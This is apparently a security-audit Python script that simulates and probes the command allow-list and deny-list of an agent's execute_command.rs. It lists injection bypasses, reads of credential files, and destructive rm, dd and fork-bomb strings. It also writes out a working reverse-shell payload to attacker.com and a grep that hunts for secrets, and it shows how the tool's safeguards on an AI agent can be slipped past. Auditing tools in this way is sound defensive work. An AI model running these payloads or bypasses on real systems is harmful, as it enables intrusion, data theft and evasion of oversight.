#!/usr/bin/env python3
"""
分析 execute_command.rs 的安全机制绕过可能性
"""

import re

# 从源代码中提取的安全配置
SAFE_COMMANDS = [
    "ls", "cat", "head", "tail", "grep", "find", "file", "wc", "tree",
    "git log", "git diff", "git show", "git status", "cargo check",
    "cargo clippy", "cargo audit", "npm audit", "python -m py_compile",
    "semgrep", "rg", "fd"
]

BLOCKED_COMMANDS = [
    "rm -rf /", "mkfs", "dd", "shutdown", "reboot", "poweroff", "halt",
    ":(){:|:&};:"  # fork bomb
]

def extract_command_prefix(command):
    """模拟 Rust 代码中的 extract_command_prefix 函数"""
    trimmed = command.strip()
    parts = trimmed.split()
    
    if not parts:
        return "", None
    
    first = parts[0]
    if len(parts) >= 2:
        # 模拟双词前缀计算
        second = parts[1]
        # 简化实现：直接拼接
        two_word = f"{first} {second}"
        return first, two_word
    return first, None

def is_safe_rust(command):
    """模拟 Rust 代码中的 is_safe 函数"""
    trimmed = command.strip()
    first, _ = extract_command_prefix(trimmed)
    
    for safe in SAFE_COMMANDS:
        if ' ' in safe:
            # 多词命令：检查命令是否以白名单条目开头
            if trimmed.startswith(safe):
                return True
        else:
            # 单词命令：检查第一个单词是否匹配
            if first == safe:
                return True
    return False

def is_blocked_rust(command):
    """模拟 Rust 代码中的 is_blocked 函数"""
    trimmed = command.strip()
    return any(blocked in trimmed for blocked in BLOCKED_COMMANDS)

def test_bypass_scenarios():
    """测试各种绕过场景"""
    print("=== 安全机制绕过测试 ===\n")
    
    test_cases = [
        # 1. 命令注入绕过
        ("ls; echo '注入成功'", "命令注入"),
        ("ls && echo '注入成功'", "逻辑与注入"),
        ("ls || echo '注入成功'", "逻辑或注入"),
        ("ls | echo '注入成功'", "管道注入"),
        ("ls `echo 注入`", "反引号注入"),
        ("ls $(echo 注入)", "命令替换注入"),
        
        # 2. 路径遍历/参数滥用
        ("cat /etc/passwd", "cat 读取敏感文件"),
        ("cat ../../etc/passwd", "路径遍历"),
        ("find / -name '*.txt'", "find 搜索全盘"),
        ("grep -r 'password' /", "grep 搜索敏感信息"),
        
        # 3. 白名单命令滥用
        ("git log --pretty=format:'%H %s' --all", "git log 可能泄露敏感信息"),
        ("cargo check --help", "帮助信息可能包含敏感信息"),
        ("python -m py_compile /etc/passwd", "编译敏感文件"),
        
        # 4. 环境变量和特殊字符
        ("ls $HOME", "环境变量展开"),
        ("ls ~", "家目录展开"),
        ("ls --help", "帮助信息"),
        
        # 5. 编码和混淆
        ("l\ts", "制表符分隔"),
        ("l\\s", "转义字符"),
        ("$(echo ls)", "命令替换"),
        ("`echo ls`", "反引号命令替换"),
        
        # 6. 危险命令变体
        ("rm -rf /tmp/test", "危险命令但不在黑名单"),
        ("rm -rf /*", "通配符危险命令"),
        (":(){ :|:& };:", "fork bomb变体"),
        ("dd if=/dev/zero of=/tmp/test bs=1M count=100", "dd 危险用法"),
    ]
    
    for cmd, description in test_cases:
        safe = is_safe_rust(cmd)
        blocked = is_blocked_rust(cmd)
        status = "✅ 安全" if safe else ("🚫 阻止" if blocked else "⚠️ 需确认")
        
        print(f"{status}: {description}")
        print(f"   命令: {cmd}")
        print(f"   白名单: {safe}, 黑名单: {blocked}")
        
        # 分析绕过可能性
        if safe and any(x in cmd for x in [';', '&&', '||', '|', '`', '$(']):
            print(f"   ⚠️ 警告: 白名单命令包含命令注入字符!")
        elif not blocked and any(x in cmd for x in ['rm -rf', 'dd', 'mkfs']):
            print(f"   ⚠️ 警告: 危险命令不在黑名单中!")
        print()

def analyze_security_weaknesses():
    """分析安全弱点"""
    print("\n=== 安全弱点分析 ===\n")
    
    weaknesses = [
        {
            "title": "命令注入漏洞",
            "description": "白名单命令可以通过 shell 元字符注入额外命令",
            "example": "ls; rm -rf /tmp/important",
            "severity": "高危",
            "cwe": "CWE-78: OS Command Injection"
        },
        {
            "title": "黑名单绕过",
            "description": "黑名单使用 contains() 检查，容易被绕过",
            "example": "rm -rf /tmp/test  # 不在黑名单中",
            "severity": "中危",
            "cwe": "CWE-184: Incomplete Blacklist"
        },
        {
            "title": "白名单命令滥用",
            "description": "白名单命令可能被用于恶意目的",
            "example": "cat /etc/shadow  # cat 在白名单中",
            "severity": "中危",
            "cwe": "CWE-250: Execution with Unnecessary Privileges"
        },
        {
            "title": "用户确认绕过（Web模式）",
            "description": "Web 模式使用 always_confirm()，所有命令自动放行",
            "example": "Web 模式下任何命令都无需确认",
            "severity": "高危",
            "cwe": "CWE-862: Missing Authorization"
        },
        {
            "title": "路径遍历",
            "description": "白名单命令可以访问任意路径",
            "example": "find /home -name '*.txt'",
            "severity": "中危",
            "cwe": "CWE-22: Path Traversal"
        },
        {
            "title": "环境变量注入",
            "description": "命令中的环境变量会被 shell 展开",
            "example": "ls $SECRET_PATH",
            "severity": "低危",
            "cwe": "CWE-78: OS Command Injection"
        },
    ]
    
    for weakness in weaknesses:
        print(f"【{weakness['severity']}】{weakness['title']}")
        print(f"  CWE: {weakness['cwe']}")
        print(f"  描述: {weakness['description']}")
        print(f"  示例: {weakness['example']}")
        print()

def generate_exploit_payloads():
    """生成利用载荷"""
    print("\n=== 潜在利用载荷 ===\n")
    
    payloads = [
        {
            "name": "命令注入",
            "payload": "ls; echo '恶意代码执行'; whoami; id",
            "effect": "执行任意命令"
        },
        {
            "name": "文件泄露",
            "payload": "cat /etc/passwd | base64",
            "effect": "读取敏感文件"
        },
        {
            "name": "反向shell",
            "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "effect": "建立反向shell连接"
        },
        {
            "name": "权限提升探测",
            "payload": "find / -perm -4000 -type f 2>/dev/null",
            "effect": "查找SUID文件"
        },
        {
            "name": "数据窃取",
            "payload": "grep -r 'password\|secret\|token' /home 2>/dev/null | head -20",
            "effect": "搜索敏感信息"
        },
    ]
    
    for p in payloads:
        safe = is_safe_rust(p['payload'])
        blocked = is_blocked_rust(p['payload'])
        
        print(f"【{p['name']}】")
        print(f"  载荷: {p['payload'][:80]}...")
        print(f"  效果: {p['effect']}")
        print(f"  检测: 白名单={safe}, 黑名单={blocked}")
        print()

if __name__ == "__main__":
    test_bypass_scenarios()
    analyze_security_weaknesses()
    generate_exploit_payloads()